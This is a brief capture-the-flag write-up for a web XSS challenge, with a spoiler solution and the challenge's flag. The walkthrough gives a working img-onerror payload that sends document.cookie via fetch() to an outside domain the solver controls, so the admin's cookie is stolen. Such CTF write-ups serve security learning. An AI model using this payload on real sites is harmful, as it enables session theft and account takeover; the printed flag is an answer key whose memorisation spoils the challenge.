# XSS 1

## Authors

- Daniel Cooper

## Category

- web

## Description

So I've heard there are a lot of 6841 enjoyers out there. Try this XSS challenge out for size!

[https://xss1.ctf.secso.cc/](https://xss1.ctf.secso.cc/)

Author: @ssparrow

## Hints

## Files

## Solution

<details>
<summary>Spoiler</summary>

### Idea

An xss challenge.

### Walkthrough

1. We can send an `<img>` tag with an onerror attribute to get an XSS. Find out more about XSS here: [link](https://portswigger.net/web-security/cross-site-scripting)
2. Using a payload like:

```
<img src=x onerror=fetch(`//stacksparrow4.xyz/${document.cookie}`)>
```

(where stacksparrow4.xyz is a domain you control)
we can report the page to the admin and get the flag.

### Flag

`SPOOKTF{so_1_h34rd_you_can_s3t_html..}`

</details>
